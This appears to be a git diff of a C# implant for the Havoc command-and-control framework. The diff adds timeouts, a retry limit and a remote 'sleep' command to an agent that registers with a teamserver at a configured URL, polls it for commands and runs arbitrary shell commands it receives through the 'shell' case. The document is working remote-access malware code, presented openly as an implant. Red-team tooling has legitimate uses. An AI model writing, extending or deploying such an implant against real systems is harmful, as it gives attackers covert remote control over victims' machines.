@@ -21,13 +21,16 @@ namespace HavocImplant
     {
         // Altered by build
         string url = Config.url;
-        int sleepTime = Config.sleepTime;
+        public int sleepTime = Config.sleepTime;
+        int timeout = Config.timeout;
+        public int maxTries = Config.maxTries;
 
         // Communication with Teamserver
         byte[] id;
         byte[] magic;
         bool registered;
         public string outputData = "";
+        int timeoutCounter = 0;
 
         // Registration Properties
         string hostname = Dns.GetHostName();
@@ -45,8 +48,11 @@ namespace HavocImplant
         {
             Implant implant = new Implant();
             while (!implant.registered) implant.Register();
+            Console.WriteLine($"Implant will disconnect after {implant.maxTries} fails");
+            Console.WriteLine($"Implant will consider {implant.timeout/1000} as the timeout");
             while (true)
             {
+                Console.WriteLine($"Failed Checkins: {implant.timeoutCounter}");
                 string commands = implant.CheckIn(implant.outputData);
                 implant.outputData = "";
                 if (commands.Length > 4)
@@ -64,14 +70,17 @@ namespace HavocImplant
                         switch (sanitizedCommand.Split(' ')[0])
                         {
                             case "shell":
-                                Thread childThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5)));
-                                childThread.Start();
+                                Thread shellThread = new Thread(() => AgentFunctions.Shell.Run(implant, command.Substring(5)));
+                                shellThread.Start();
                                 break;
-                            //outputData += implant.runCommand(command.Substring(5)).Replace("\\", "\\\\"); break; // Parse the shell command after the "shell"
                             case "goodbye":
-                                Console.WriteLine("It is die time my dudes"); Environment.Exit(0); break;
+                                Console.WriteLine("It is die time my dudes"); Environment.Exit(Environment.ExitCode); break;
+                            case "sleep":
+                                Thread sleepThread = new Thread(() => AgentFunctions.Sleep.Run(implant, command.Substring(5)));
+                                sleepThread.Start();
+                                break;
                         }
-                        //Console.WriteLine("Output Data: {0}", outputData);
+                        Console.WriteLine("Output Data: {0}", implant.outputData);
                     }
                 }
                 Thread.Sleep(implant.sleepTime);
@@ -175,6 +184,7 @@ namespace HavocImplant
             request.Method = "POST";
             request.ContentType = "application/x-www-form-urlencoded";
             request.ContentLength = data.Length;
+            request.Timeout = timeout;
             try
             {
                 using (var stream = request.GetRequestStream())
@@ -185,6 +195,7 @@ namespace HavocImplant
 
                 byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                 responseString = Encoding.UTF8.GetString(bytes);
+                timeoutCounter = 0;
             }
             catch (WebException ex)
             {
@@ -194,6 +205,12 @@ namespace HavocImplant
 
                     byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                     responseString = Encoding.UTF8.GetString(bytes);
+                    timeoutCounter = 0;
+                }
+                if (ex.Status == WebExceptionStatus.Timeout)
+                {
+                    timeoutCounter += 1;
+                    if (timeoutCounter == maxTries) Environment.Exit(Environment.ExitCode);
                 }
             }
             return responseString;
